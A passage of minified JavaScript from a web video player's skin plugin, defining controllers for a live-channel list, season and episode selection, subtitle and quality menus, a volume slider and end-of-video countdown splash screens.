Date,null==(b=b.data)||0==b.length?(this.listView.root.visible=!1,this.destroyRoot()):(this.listView.root.visible=!0,this.buildRoot(!0),this.listView.list.compare=U(this,this.compareLiveChannels),this.listView.list.onItemSelect=U(this,this.onClickPlay),this.listView.list.set_data(b),this.listView.list.buildNativeElement(),this.listView.list.select(this.media),this.updateCurrentMediaProgramsList(),this.startEpgRefreshTimer(),this.startNextProgrammeTimer())},compareLiveChannels:function(b,c){return(null!=b?b.id:null)==(null!=c?c.id:null)},updateCurrentMediaProgramsList:function(){if(null!=this.media&&this.media instanceof Ba&&null!=this.listView.list.data)for(var b=this.media,c=this.listView.list.data,d=0;d<c.length;){var q=c[d];++d,this.compareLiveChannels(q,b)&&(b.programs=q.programs)}},onClickPlay:function(b,c){var d=this;null!=b&&this.media.id!=fb.__cast(b,va).id&&(null==this.media.customParams&&(this.media.customParams=new Jb),this.media.customParams.h.mediaChangeByChannelsController=!0,this.listView.popup.visible=!1,this.destroyPopup(),c=function(q){d.variables.autoplay=!0,(q=new W("getMedia")).data=b.id,q.dispatch(d.context)},"paused"!=this.playbackStateMonitor.state?(T.addOnce(this.context,"paused",c),new W("skinPause").dispatch(this.context),new T("bufferingStart").dispatch(this.context)):(new T("bufferingStart").dispatch(this.context),c(null)),this.videoEventAdded||(T.add(this.context,"ready",U(this,this.onVideoReady)),this.videoEventAdded=!0))},onVideoReady:function(b){new W("skinPlay").dispatch(this.context)},__class__:Id});var me=function(){this.videoEventAdded=!1,vc.call(this)};wa["bs.player.plugin.skin.controller.element.popup.SeriesController"]=me,me.__name__="bs.player.plugin.skin.controller.element.popup.SeriesController",me.__super__=vc,me.prototype=Ja(vc.prototype,{seriesView:null,availableSeasonsNumbers:null,currentSeasonNumber:null,episode:null,serie:null,videoEventAdded:null,media:null,playbackStateMonitor:null,init:function(){this.autoSize=!1,vc.prototype.init.call(this),null!=this.view&&(this.seriesView=this.view,this.availableSeasonsNumbers=[],null!=this.seriesView.popup&&null!=this.seriesView.root&&null!=this.seriesView.list&&null!=this.seriesView.title&&null!=this.seriesView.listButtonLeft&&null!=this.seriesView.listButtonRight&&(this.seriesView.root.visible=!1,this.destroyRoot(),this.playbackStateMonitor=new ha(this.context),this.playbackStateMonitor.init(),this.seriesView.listButtonLeft.addEventListener("click",U(this,this.onLeftClick)),this.seriesView.listButtonRight.addEventListener("click",U(this,this.onRightClick)),aa.add(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.add(this.context,"serieData",U(this,this.onSerieData)),aa.add(this.context,"seasonEpisodesData",U(this,this.onEpisodesData))))},destroy:function(){this.playbackStateMonitor.destroy(),aa.remove(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.remove(this.context,"serieData",U(this,this.onSerieData)),aa.remove(this.context,"seasonEpisodesData",U(this,this.onEpisodesData)),null!=this.seriesView&&(null!=this.seriesView.listButtonLeft&&this.seriesView.listButtonLeft.removeEventListener("click",U(this,this.onLeftClick)),null!=this.seriesView.listButtonRight&&this.seriesView.listButtonRight.removeEventListener("click",U(this,this.onRightClick))),vc.prototype.destroy.call(this)},buildList:function(){this.seriesView.list.select(this.episode),vc.prototype.buildList.call(this)},onMetadataData:function(b){this.media=b.data,this.media instanceof Zb?(this.seriesView.root.visible=!0,this.buildRoot(!0),this.episode=this.media,this.seriesView.title.set_text(Yb.translate("season")+" "+this.episode.season.seasonNumber),this.currentSeasonNumber!=this.episode.season.seasonNumber&&(this.loadSeries(this.episode.season.serie.id),this.loadEpisodes(this.episode.season.serie.id,this.episode.season.id+"")),this.currentSeasonNumber=this.episode.season.seasonNumber):(this.seriesView.root.visible=!1,this.destroyRoot())},loadEpisodes:function(b,c){var d=new W("getEpisodes");d.data={serieId:b,seasonId:c},d.dispatch(this.context)},loadSeries:function(b){var c=new W("getSeries");c.data={id:b},c.dispatch(this.context)},onEpisodesData:function(b){this.seriesView.spinner.visible=!1,this.seriesView.spinner.destroyNativeElement(),this.seriesView.list.compare=U(this,this.isSelected),this.seriesView.list.onItemClick=U(this,this.onClickPlay),this.seriesView.list.set_data(b.data),null!=this.episode&&this.seriesView.list.select(this.episode),this.isBuild&&this.seriesView.list.buildNativeElement(!0,!0)},onSerieData:function(b){this.serie=b.data,this.availableSeasonsNumbers=[],b=0;for(var c=this.serie.seasons;b<c.length;){var d=c[b];++b,this.availableSeasonsNumbers.push(d.seasonNumber)}this.availableSeasonsNumbers.sort(U(this,this.intCmp)),this.checkLeftRightButtons()},intCmp:function(b,c){return b<c?-1:b>c?1:0},checkLeftRightButtons:function(){var b=this.availableSeasonsNumbers.indexOf(this.currentSeasonNumber);this.seriesView.listButtonLeft.set_visible_with_redraw(0<b),this.seriesView.listButtonRight.set_visible_with_redraw(b<this.availableSeasonsNumbers.length-1)},isSelected:function(b,c){return b=fb.__cast(b,Zb),c=fb.__cast(c,Zb),null!=b.customParams&&null!=b.customParams.h.mediaId&&null!=c.customParams&&null!=c.customParams.h.mediaId?b.customParams.h.mediaId==c.customParams.h.mediaId:b.id==c.id},onVideoReady:function(b){new W("skinPlay").dispatch(this.context)},onClickPlay:function(b){var c=this;if(this.episode.id!=fb.__cast(b,Zb).id){null==this.episode.customParams&&(this.episode.customParams=new Jb),this.episode.customParams.h.mediaChangeBySeriesController=!0,this.seriesView.popup.visible=!1,this.destroyPopup();var d=function(X){c.variables.autoplay=!0,(X=new W("skinSeek")).data=0,X.dispatch(c.context),(X=new W("getMedia")).data=b.id,X.dispatch(c.context)},q=this.playbackStateMonitor.state;"playing"==q||"buffering"==q||"seeking"==q?(T.addOnce(this.context,"paused",d),new W("skinPause").dispatch(this.context)):d(null)}},onLeftClick:function(b){this.switchSerie(-1)},onRightClick:function(b){this.switchSerie(1)},switchSerie:function(b){var c=this.availableSeasonsNumbers.indexOf(this.currentSeasonNumber);0<b?c<this.availableSeasonsNumbers.length-1&&++c:0>b&&0<c&&--c,this.currentSeasonNumber=this.availableSeasonsNumbers[c],this.checkLeftRightButtons(),this.seriesView.spinner.visible=!0,this.seriesView.spinner.buildNativeElement(),this.seriesView.list.set_data([]),this.seriesView.title.set_text(Yb.translate("season")+" "+this.currentSeasonNumber),b=null,c=0;for(var d=this.serie.seasons;c<d.length;){var q=d[c];if(++c,q.seasonNumber==this.currentSeasonNumber){b=q;break}}this.loadEpisodes(this.serie.id,b.id+"")},__class__:me});var Vd=function(){vc.call(this)};wa["bs.player.plugin.skin.controller.element.popup.SubtitlesPopupListController"]=Vd,Vd.__name__="bs.player.plugin.skin.controller.element.popup.SubtitlesPopupListController",Vd.__super__=vc,Vd.prototype=Ja(vc.prototype,{init:function(){vc.prototype.init.call(this),null!=this.listView&&null!=this.listView.list&&(aa.add(this.context,"subtitleData",U(this,this.onSubtitleData)),aa.add(this.context,"mediaMetadataData",U(this,this.onMediaData)))},destroy:function(){aa.remove(this.context,"subtitleData",U(this,this.onSubtitleData)),aa.remove(this.context,"mediaMetadataData",U(this,this.onMediaData)),vc.prototype.destroy.call(this)},onListItemSelect:function(b,c){var d=new W("selectSubtitles");b==c?(this.listView.list.deselect(),d.data=null):d.data=b.data,d.dispatch(this.context),b=null,null!=d.data&&(b=d.data.languageCode),this.setUserSettingsLang(b)},onSubtitleData:function(b){if(null==b.data)this.listView.root.visible=!1,this.destroyRoot();else{b=b.data;for(var c=[],d=0;d<b.length;){var q=b[d];++d,null!=q.name&&""!=q.name&&"null"!=q.name&&null!=q.languageCode&&""!=q.languageCode&&"null"!=q.languageCode&&c.push({label:q.name,data:q})}0<c.length?(this.listView.root.visible=!0,this.buildRoot(!0),this.listView.list.onItemSelect=U(this,this.onListItemSelect),this.listView.list.set_data(c),this.listView.popup.set_height(this.listView.list.calculateListHeight()+this.listView.list.get_top()+this.listView.list.get_bottom()),this.setDefaultLang(),this.updatePopupListHeight()):(this.listView.root.visible=!1,this.destroyRoot())}},onMediaData:function(b){this.listView.root.visible=!1,this.destroyRoot()},setDefaultLang:function(){if(null!=this.listView.list.data){for(var b=this.listView.list.data,c=[],d=0;d<b.length;){var q=b[d];++d,c.push(q.data.languageCode)}if(0!=(d=c).length){var X=null;for(c=0;c<b.length;)if(q=b[c],++c,q.data.preselected){X=ba.findBestFittingLangCodeForSelected(q.data.languageCode,d);break}if(null!=this.variables.subtitles&&(X=ba.findBestFittingLangCodeForSelected(this.variables.subtitles,d)),null!=(c=this.getUserSettingsLang())&&(null!=(c=ba.findBestFittingLangCodeForSelected(c,d))&&(X=c)),null!=X)for(c=0,d=b.length;c<d;)if(b[q=c++].data.languageCode==X){this.listView.list.select(this.listView.list.data[q]);break}}}},setUserSettingsLang:function(b){if(null!=Tb.getSessionStorage())try{null==b?Tb.getSessionStorage().removeItem("_brplayer_sub_lang"):Tb.getSessionStorage().setItem("_brplayer_sub_lang",null==b?"null":""+b)}catch(c){}},getUserSettingsLang:function(){var b=null;if(null!=Tb.getSessionStorage())try{b=Tb.getSessionStorage().getItem("_brplayer_sub_lang")}catch(c){}return b},getPopupListAdditionalPadding:function(){var b=0;return null!=this.listView&&null!=this.listView.list&&null!=this.listView.list.parent&&(b+=this.listView.list.parent.get_top()),b},__class__:Vd});var fd=function(){vc.call(this)};wa["bs.player.plugin.skin.controller.element.popup.VideoQualityPopupListController"]=fd,fd.__name__="bs.player.plugin.skin.controller.element.popup.VideoQualityPopupListController",fd.__super__=vc,fd.prototype=Ja(vc.prototype,{selectedData:null,qualityByDataKey:null,currentQualityDataKey:null,qualityAutoLevelLabelRenderer:null,qualityAutoLevelOrgLabel:null,init:function(){vc.prototype.init.call(this),null!=this.listView&&null!=this.listView.list&&(aa.add(this.context,"videoQualityData",U(this,this.onQualityData)),aa.add(this.context,"videoQualityPlaybackLevelChange",U(this,this.onQualityPlaybackLevelChange)),W.add(this.context,"videoQualityHasChanged",U(this,this.onQualityChange)))},destroy:function(){aa.remove(this.context,"videoQualityData",U(this,this.onQualityData)),aa.remove(this.context,"videoQualityPlaybackLevelChange",U(this,this.onQualityPlaybackLevelChange)),W.remove(this.context,"videoQualityHasChanged",U(this,this.onQualityChange)),vc.prototype.destroy.call(this),this.qualityByDataKey=null},buildList:function(){vc.prototype.buildList.call(this),this.updateSelected()},onQualityChange:function(b){this.selectedData=b.data,this.updateSelected()},onQualityPlaybackLevelChange:function(b){null!=b&&null!=b.data&&null!=this.qualityByDataKey&&(b=b.data,Object.prototype.hasOwnProperty.call(this.qualityByDataKey.h,b)&&(this.currentQualityDataKey=b,this.updateAutoLevelLabel()))},getPopupListAdditionalPadding:function(){var b=0;return null!=this.listView&&null!=this.listView.list&&null!=this.listView.list.parent&&(b+=this.listView.list.parent.get_top()),b},updateAutoLevelLabel:function(){if(null!=this.qualityByDataKey&&null!=this.qualityAutoLevelLabelRenderer&&null!=this.qualityAutoLevelOrgLabel&&Object.prototype.hasOwnProperty.call(this.qualityByDataKey.h,"-1")){var b=this.qualityAutoLevelOrgLabel;"-1"==this.selectedData&&null!=this.currentQualityDataKey&&Object.prototype.hasOwnProperty.call(this.qualityByDataKey.h,this.currentQualityDataKey)&&(b+=" ("+this.qualityByDataKey.h[this.currentQualityDataKey].label+")"),this.qualityByDataKey.h[-1].label=b,this.qualityAutoLevelLabelRenderer.updateItemsData()}},updateSelected:function(){if(null!=this.selectedData){var b=this.listView.list.data;if(null!=b)for(var c=0;c<b.length;){var d=b[c];if(++c,d.data==this.selectedData){this.listView.list.select(d);break}}}},onQualityData:function(b){if(null==b.data)this.listView.root.visible=!1,this.destroyRoot();else{var c=b.data;if(1<c.length){for(this.qualityByDataKey=new Jb,b=0;b<c.length;){var d=c[b];++b,this.qualityByDataKey.h[d.data]=d}if(this.listView.root.visible=!0,this.buildRoot(!0),this.listView.list.compare=U(this,this.isSelected),this.listView.list.onItemSelect=U(this,this.onItemSelect),this.listView.list.set_data(c),this.currentQualityDataKey=this.qualityAutoLevelOrgLabel=this.qualityAutoLevelLabelRenderer=null,Object.prototype.hasOwnProperty.call(this.qualityByDataKey.h,"-1"))for(c=this.qualityByDataKey.h[-1],this.qualityAutoLevelOrgLabel=c.label,b=0,d=this.listView.list.items;b<d.length;){var q=d[b];++b,q.data==c&&q instanceof Gc&&(this.qualityAutoLevelLabelRenderer=q)}this.updatePopupListHeight()}else this.listView.root.visible=!1,this.destroyRoot()}},isSelected:function(b,c){return fb.__cast(b,Eb).data==fb.__cast(c,Eb).data},onItemSelect:function(b,c){(c=new W("requestVideoQualityChange")).data=b.data,c.dispatch(this.context),this.updateAutoLevelLabel()},__class__:fd});var yd=function(){this.updatePositionOnEvent=!0,this.indicatorMinimum=this.indicatorMaximum=this.indicatorCurrent=0,this.isMuted=this.isTrackDown=this.isIndicatorDown=this.isInitializing=!1,this.volumeValue=1,Mc.call(this)};wa["bs.player.plugin.skin.controller.element.popup.VolumeController"]=yd,yd.__name__="bs.player.plugin.skin.controller.element.popup.VolumeController",yd.__super__=Mc,yd.prototype=Ja(Mc.prototype,{volumeView:null,volumeValue:null,isMuted:null,isTrackDown:null,isIndicatorDown:null,isInitializing:null,lastMousePosition:null,indicatorMinimum:null,indicatorMaximum:null,indicatorCurrent:null,disableHtmlSelectionFunction:null,updatePositionOnEvent:null,init:function(){if(Mc.prototype.init.call(this),null!=this.view&&(this.isInitializing=!0,this.volumeView=this.view,null!=this.view.root&&null!=this.volumeView.popup&&null!=this.volumeView.track&&null!=this.volumeView.progress&&null!=this.volumeView.indicator))if((h.isMobile()||h.isSmartTV())&&1!=this.variables.mute)this.showSpacers(!1),this.view.root.visible=!1,this.volumeView.popup.visible=!1,this.volumeView.track.visible=!1,this.volumeView.indicator.visible=!1,this.volumeView.progress.visible=!1,this.view.root.update();else{this.volumeView.root.addEventListener("click",U(this,this.onButtonClick)),this.volumeView.track.addEventListener("mousedown",U(this,this.onTrackDown)),this.volumeView.track.addEventListener("mouseup",U(this,this.onTrackUp)),this.volumeView.indicator.addEventListener("mousedown",U(this,this.onIndicatorDown)),this.volumeView.indicator.addEventListener("mouseup",U(this,this.onIndicatorUp)),this.volumeView.stage.addEventListener("mousedown",U(this,this.onStageMouseDown)),this.indicatorMinimum=0,this.indicatorMaximum=this.volumeView.indicator.parent.calculateHeight()-this.volumeView.indicator.calculateHeight(),W.add(this.context,"skinVolume",U(this,this.handleVolumeEventChange)),W.add(this.context,"skinMute",U(this,this.onMuteEvent)),W.add(this.context,"skinUnmute",U(this,this.onUnmuteEvent));var b=Ic.getConfigValue(this.variables,"volume");if(null!=b&&(this.volumeValue=parseFloat(b)),null!=Tb.getSessionStorage())try{var c=Tb.getSessionStorage().getItem("_brplayer_vol");null!=c&&(this.volumeValue=parseFloat(c))}catch(d){}b=this.isMuted?0:this.volumeValue,this.initVolumePosition(b),this.setRootState(["over"]),this.dispatchVolumeValue(b),this.showSpacers(!0),this.isInitializing=!1}},destroy:function(){W.remove(this.context,"skinVolume",U(this,this.handleVolumeEventChange)),W.remove(this.context,"skinMute",U(this,this.onMuteEvent)),W.remove(this.context,"skinUnmute",U(this,this.onUnmuteEvent)),null!=this.volumeView&&(null!=this.volumeView.root&&this.volumeView.root.removeEventListener("click",U(this,this.onButtonClick)),null!=this.volumeView.track&&(this.volumeView.track.removeEventListener("mousedown",U(this,this.onTrackDown)),this.volumeView.track.removeEventListener("mouseup",U(this,this.onTrackUp))),null!=this.volumeView.indicator&&(this.volumeView.indicator.removeEventListener("mousedown",U(this,this.onIndicatorDown)),this.volumeView.indicator.removeEventListener("mouseup",U(this,this.onIndicatorUp))),null!=this.volumeView.stage&&this.volumeView.stage.removeEventListener("mousedown",U(this,this.onStageMouseDown)),this.volumeView.destroy()),Mc.prototype.destroy.call(this)},setRootState:function(b){this.isMuted?this.view.root.setStateName(b.concat(["mute"])):this.view.root.setStateName(b.concat(["volume"])),this.view.root.update()},handleVolumeEventChange:function(b){0==this.updatePositionOnEvent?this.updatePositionOnEvent=!0:(this.volumeValue=parseFloat(b.data),b=this.volumeView.track.calculateHeight(),this.volumeView.progress.set_height(this.volumeValue*b),this.indicatorCurrent=b-this.volumeView.progress.get_height(),this.checkIndicatorPosition(),this.volumeView.indicator.set_top(this.indicatorCurrent),this.volumeView.indicator.update(),this.volumeView.popup.update(),this.isMuted=0==this.volumeValue,this.setRootState(["over"]))},onMuteEvent:function(b){this.isMuted||this.toggleMute()},onUnmuteEvent:function(b){this.isMuted&&this.toggleMute()},initVolumePosition:function(b){var c=this.volumeView.track.calculateHeight();this.volumeView.progress.set_height(b*c),this.indicatorCurrent=c-this.volumeView.progress.get_height(),this.checkIndicatorPosition(),this.volumeView.indicator.set_top(this.indicatorCurrent),this.volumeView.indicator.update(),this.volumeView.popup.update()},onButtonClick:function(b){this.toggleMute()},toggleMute:function(){var b=this.volumeView.track.calculateHeight(),c=this.isMuted?this.volumeValue:0;this.volumeView.progress.set_height(c*b),this.indicatorCurrent=b-this.volumeView.progress.get_height(),this.checkIndicatorPosition(),this.volumeView.indicator.set_top(this.indicatorCurrent),this.volumeView.indicator.update(),this.isMuted=!this.isMuted,this.setRootState(["over"]),this.dispatchVolumeValue(c)},checkIndicatorPosition:function(){this.indicatorCurrent=this.indicatorCurrent<this.indicatorMinimum?this.indicatorMinimum:this.indicatorCurrent,this.indicatorCurrent=this.indicatorCurrent>this.indicatorMaximum?this.indicatorMaximum:this.indicatorCurrent},setState:function(b){this.isMuted&&0<b?(this.isMuted=!1,this.setRootState(["over"])):this.isMuted||0!=b||(this.isMuted=!0,this.setRootState(["over"]))},dispatchVolumeValue:function(b){this.updatePositionOnEvent=!1;var c=new W("skinVolume");if(c.data=b,c.dispatch(this.context),!this.isInitializing&&null!=Tb.getSessionStorage())try{var d=da.substr(null==b?"null":""+b,0,5);Tb.getSessionStorage().setItem("_brplayer_vol",d)}catch(q){}},onTrackDown:function(b){this.isIndicatorDown||(this.isTrackDown=!0)},onTrackUp:function(b){if(this.isTrackDown){if(this.lastMousePosition=this.getPointerPosition(b),this.indicatorCurrent=this.lastMousePosition.y,this.checkIndicatorPosition(),b=this.volumeView.track.calculateHeight(),this.volumeValue=1-this.indicatorCurrent/b,0>this.volumeValue||1<this.volumeValue)return;this.volumeView.progress.set_height(this.volumeValue*b),this.volumeView.indicator.set_top(this.indicatorCurrent),this.volumeView.indicator.update(),this.setState(this.volumeValue),this.dispatchVolumeValue(this.volumeValue)}this.isTrackDown=!1},getPointerPosition:function(b){return new Vb(b.mouseX,b.mouseY)},onMouseUp:function(b){this.isIndicatorDown=!1,this.checkPopupHide(),this.enableHtmlSelection()},onMouseMove:function(b){b.stopPropagation(),this.isIndicatorDown&&(b=this.getPointerPosition(b),this.indicatorCurrent+=b.y-this.lastMousePosition.y,this.lastMousePosition.y=b.y,this.checkIndicatorPosition(),this.volumeValue=1-this.indicatorCurrent/this.indicatorMaximum,this.volumeView.progress.set_height(this.volumeValue*this.volumeView.track.calculateHeight()),this.volumeView.indicator.set_top(this.indicatorCurrent),this.volumeView.indicator.update(),this.setState(this.volumeValue),this.dispatchVolumeValue(this.volumeValue))},disableHtmlSelection:function(){this.disableHtmlSelectionFunction=function(b){return b.preventDefault(),!1},window.document.addEventListener("selectstart",this.disableHtmlSelectionFunction)},enableHtmlSelection:function(){null!=this.disableHtmlSelectionFunction&&(window.document.removeEventListener("selectstart",this.disableHtmlSelectionFunction),this.disableHtmlSelectionFunction=null)},onStageMouseDown:function(b){this.lastMousePosition=this.getPointerPosition(b)},onIndicatorDown:function(b){this.volumeView.stage.addEventListener("mousemove",U(this,this.onMouseMove)),this.volumeView.stage.addEventListener("mouseup",U(this,this.onMouseUp)),this.disableHtmlSelection(),this.isIndicatorDown=!0},onIndicatorUp:function(b){this.isIndicatorDown=!1,this.checkPopupHide()},checkPopupHideDelayed:function(){0==this.isIndicatorDown&&Mc.prototype.checkPopupHideDelayed.call(this)},__class__:yd});var ec=function(b){this.fallbackData=this.fallbackSize=null,this.active=this.useBackdrop=this.beforeDisableActiveState=!1,zb.call(this),this.name=b};wa["bs.player.plugin.skin.controller.element.splash.core.SplashController"]=ec,ec.__name__="bs.player.plugin.skin.controller.element.splash.core.SplashController",ec.__super__=zb,ec.prototype=Ja(zb.prototype,{name:null,disabled:null,active:null,useBackdrop:null,beforeDisableActiveState:null,stageSize:null,fallbackData:null,fallbackSize:null,init:function(){var b=this;zb.prototype.init.call(this),null!=this.view&&(this.hideAllEndSplashes(),T.add(this.context,"playing",U(this,this.onVideoPlaying)),T.add(this.context,"paused",U(this,this.onVideoPaused)),T.add(this.context,"complete",U(this,this.onVideoComplete)),Q.add(this.context,"adDisableControls",U(this,this.onDisable)),Q.add(this.context,"adEnableControls",U(this,this.onEnable)),na.add(this.context,"resize",(function(c){b.stageSize=fb.__cast(c.data,Vb)})))},destroy:function(){this.resetStateForReinit(),this.view.destroy(),zb.prototype.destroy.call(this)},resetStateForReinit:function(){T.remove(this.context,"playing",U(this,this.onVideoPlaying)),T.remove(this.context,"paused",U(this,this.onVideoPaused)),T.remove(this.context,"complete",U(this,this.onVideoComplete)),Q.remove(this.context,"adDisableControls",U(this,this.onDisable)),Q.remove(this.context,"adEnableControls",U(this,this.onEnable)),this.disabled=!0,this.active=!1},restore:function(b){},onVideoPlaying:function(b){},onVideoPaused:function(b){},onVideoComplete:function(b){},onDisable:function(b){this.disabled=!0,this.beforeDisableActiveState=this.active,this.hideSplash()},onEnable:function(b){this.disabled=!1,this.beforeDisableActiveState&&this.showSplash()},showSplash:function(){if(this.disabled||null==this.view.root)this.hideSplash();else{if(this.view.root.visible=!0,this.buildRoot(),this.active=!0,this.useBackdrop){var b=new ma(ma.SETUP_CLICKABLE_LAYER);b.data={backdrop:!0,clickable:!1},b.dispatch(this.context)}null!=this.fallbackSize&&(na.add(this.context,"resize",U(this,this.onResizeAndFallbackToDefault)),this.onResizeAndFallbackToDefault()),null!=this.fallbackData&&(na.add(this.context,"resize",U(this,this.onResizeAndRestoreAfterFallback)),this.onResizeAndRestoreAfterFallback())}},hideSplash:function(){if(null!=this.view.root){if(this.useBackdrop){var b=new ma(ma.SETUP_CLICKABLE_LAYER);b.data={backdrop:!1,clickable:!0},b.dispatch(this.context)}this.active&&this.destroyRoot(),this.active=!1,null!=this.fallbackSize&&na.remove(this.context,"resize",U(this,this.onResizeAndFallbackToDefault)),null!=this.fallbackData&&na.remove(this.context,"resize",U(this,this.onResizeAndRestoreAfterFallback))}},hideAllEndSplashes:function(){if(null!=this.view.root&&null!=this.view.root.children){for(var b=!1,c=0,d=this.view.root.children;c<d.length;){var q=d[c];++c,null!=q.id&&0==q.id.indexOf("EndSplash")&&(q.visible=!1,q.destroyNativeElement()),q.visible&&(b=!0)}b||(this.view.root.visible=!1,this.destroyRoot()),this.active=!1,null!=this.fallbackSize&&na.remove(this.context,"resize",U(this,this.onResizeAndFallbackToDefault)),null!=this.fallbackData&&na.remove(this.context,"resize",U(this,this.onResizeAndRestoreAfterFallback))}},playMedia:function(b){if(null!=b){this.hideSplash();var c=new aa("mediaMetadataData");c.data=b,c.dispatch(this.context),(c=new aa("movieData")).data=b,c.dispatch(this.context),(c=new aa("audioData")).data=null!=b.audioSets?b.audioSets:[],c.dispatch(this.context),(c=new aa("subtitleData")).data=null!=b.subtitlesSets?b.subtitlesSets:[],c.dispatch(this.context),new W("skinPlay").dispatch(this.context)}},fallbackToDefaultEndSplash:function(b){null==b&&(b=!1);var c=new H(H.EDIT_END_SPLASH);c.data={endsplash:"",show:b},c.dispatch(this.context)},formatRestoreEndSplashData:function(){return{size:this.fallbackSize,name:this.name}},onResizeAndFallbackToDefault:function(b){null!=this.stageSize&&(this.stageSize.x<=this.fallbackSize.x||this.stageSize.y<=this.fallbackSize.y)&&(na.remove(this.context,"resize",U(this,this.onResizeAndFallbackToDefault)),(b=new H(H.EDIT_END_SPLASH)).data={endsplash:"",show:this.active,fallbackData:this.formatRestoreEndSplashData()},b.dispatch(this.context),this.fallbackSize=null)},onResizeAndRestoreAfterFallback:function(b){null!=this.stageSize&&this.stageSize.x>this.fallbackData.size.x&&this.stageSize.y>this.fallbackData.size.y&&(na.remove(this.context,"resize",U(this,this.onResizeAndRestoreAfterFallback)),(b=new H(H.EDIT_END_SPLASH)).data={endsplash:this.fallbackData.name,show:this.active,restoreData:this.fallbackData},b.dispatch(this.context),this.fallbackData=null)},__class__:ec});var Sc=function(b){this.checkAspectRatioEnabled=!1,ec.call(this,b)};wa["bs.player.plugin.skin.controller.element.splash.SplashImageBaseController"]=Sc,Sc.__name__="bs.player.plugin.skin.controller.element.splash.SplashImageBaseController",Sc.__super__=ec,Sc.prototype=Ja(ec.prototype,{splashImageContainer:null,splashImage:null,checkAspectRatioEnabled:null,originalImgSize:null,destroy:function(){na.remove(this.context,"resize",U(this,this.resizeImage)),ec.prototype.destroy.call(this)},showSplashImage:function(b){null!=this.splashImageContainer&&null!=this.splashImage&&null!=b&&""!=b?this.loadImage(b):this.hideSplashImage()},hideSplashImage:function(){this.checkAspectRatioEnabled=!1,na.remove(this.context,"resize",U(this,this.resizeImage)),null!=this.splashImageContainer&&(this.splashImageContainer.visible=!1),null!=this.splashImage&&(this.splashImage.visible=!1)},findBestFittingImage:function(b){var c=null;if(null!=this.view&&null!=this.view.stage)for(var d=0,q=0;q<b.length;){var X=b[q];++q;var ra=Math.abs(this.view.stage.get_width()-X.width);(null==c||ra<d)&&(c=X,d=ra)}if(null==c)for(q=0;q<b.length;)X=b[q],++q,(null==c||c.width<X.width)&&(c=X);return c},loadImage:function(b){this.checkAspectRatioEnabled=!1;var c=this.splashImage.data!=b||!this.splashImage.get_loaded();this.originalImgSize=null,this.splashImage.onLoad=U(this,this.onImageLoaded),this.splashImage.set_data(b),c||this.onImageLoaded(),this.splashImageContainer.visible=!0,this.splashImage.visible=!0},onImageLoaded:function(){null==this.splashImage||this.splashImage.isNativeElementNull()||(this.checkAspectRatioEnabled=!0,null==this.originalImgSize&&(this.originalImgSize=this.splashImage.get_size()),na.add(this.context,"resize",U(this,this.resizeImage)),this.resizeImage())},resizeImage:function(b){this.checkAspectRatioEnabled&&null!=this.splashImage&&null!=this.splashImageContainer&&(jd.coverRectangle(this.splashImage,this.splashImageContainer,this.originalImgSize[0],this.originalImgSize[1],this.splashImageContainer.calculateWidth(),this.splashImageContainer.calculateHeight()),this.splashImage.redraw())},__class__:Sc});var zd=function(b){this.resizeDataWithImage={content:{percentWidth:1,maxWidth:600},leftPanel:{percentWidth:.6},rightPanel:{percentWidth:.4}},this.imageUrl=null,this.created=!1,this.counter=10,ec.call(this,b),this.fallbackSize=new Vb(250,350),this.useBackdrop=!0};wa["bs.player.plugin.skin.controller.element.splash.end.CountdownEndSplashController"]=zd,zd.__name__="bs.player.plugin.skin.controller.element.splash.end.CountdownEndSplashController",zd.__super__=ec,zd.prototype=Ja(ec.prototype,{countdownEndView:null,nextMedia:null,mediaPlaylist:null,timer:null,counter:null,created:null,originalImgSize:null,imageUrl:null,resizeDataCache:null,resizeDataWithImage:null,init:function(){this.countdownEndView=this.view,null!=this.countdownEndView&&null!=this.countdownEndView.box&&null!=this.countdownEndView.content&&null!=this.countdownEndView.leftPanel&&null!=this.countdownEndView.imageContainer&&null!=this.countdownEndView.imageHolder&&null!=this.countdownEndView.imageSpinner&&null!=this.countdownEndView.title&&null!=this.countdownEndView.rightPanel&&null!=this.countdownEndView.counter&&null!=this.countdownEndView.button&&(ec.prototype.init.call(this),this.cacheResizeData(),this.active=!1,aa.add(this.context,"mediaPlaylistData",U(this,this.onPlaylistData)),na.add(this.context,"resize",U(this,this.onResize)))},cacheResizeData:function(){null==this.resizeDataCache&&(this.resizeDataCache={content:{percentWidth:this.countdownEndView.content.get_percentWidth(),maxWidth:this.countdownEndView.content.get_maxWidth()},leftPanel:{percentWidth:this.countdownEndView.leftPanel.get_percentWidth()},rightPanel:{percentWidth:this.countdownEndView.rightPanel.get_percentWidth()}})},destroy:function(){this.resetStateForReinit(),null!=this.countdownEndView&&this.countdownEndView.destroy(),ec.prototype.destroy.call(this)},resetStateForReinit:function(){this.originalImgSize=this.imageUrl=null,this.active=!1,this.disabled=!0,aa.remove(this.context,"mediaPlaylistData",U(this,this.onPlaylistData)),na.remove(this.context,"resize",U(this,this.onResize)),this.stopCountdown(),null!=this.countdownEndView&&(this.updateContentWidth(),this.updateLeftPanelWidth(),this.updateRightPanelWidth(),this.hideLeftPanel(),this.hideRightPanel(),null!=this.countdownEndView.content&&(this.countdownEndView.content.visible=!1,this.countdownEndView.content.destroyNativeElement()),null!=this.countdownEndView.box&&(this.countdownEndView.box.visible=!1,this.countdownEndView.box.destroyNativeElement())),ec.prototype.resetStateForReinit.call(this)},showSplash:function(){null!=this.countdownEndView.box&&(ec.prototype.showSplash.call(this),this.countdownEndView.box.visible=!0,this.countdownEndView.box.buildNativeElement(),this.countdownEndView.content.visible=!0,this.countdownEndView.content.buildNativeElement(),null==this.imageUrl?(this.hideLeftPanel(),this.showRightPanel(),this.start()):(this.showLeftPanel(),this.showRightPanel(),this.loadImage()),this.onResizeContent())},hideSplash:function(){this.stopCountdown(),null!=this.countdownEndView.box&&0!=this.countdownEndView.box.visible&&1!=this.countdownEndView.box.isNativeElementNull()&&(this.countdownEndView.box.visible=!1,this.countdownEndView.box.destroyNativeElement(),this.countdownEndView.content.visible=!1,this.countdownEndView.content.destroyNativeElement(),ec.prototype.hideSplash.call(this))},restore:function(b){null!=b&&(this.active=!0,this.mediaPlaylist=b.mediaPlaylist,this.nextMedia=this.mediaPlaylist.items[this.mediaPlaylist.currentPos+1],null==this.nextMedia.title&&""==this.nextMedia.title||this.countdownEndView.title.set_text(this.nextMedia.title),this.setupImage(this.nextMedia),this.countdownEndView.button.addEventListener("click",U(this,this.onButtonClick)))},onVideoPlaying:function(b){this.countdownEndView.button.removeEventListener("click",U(thi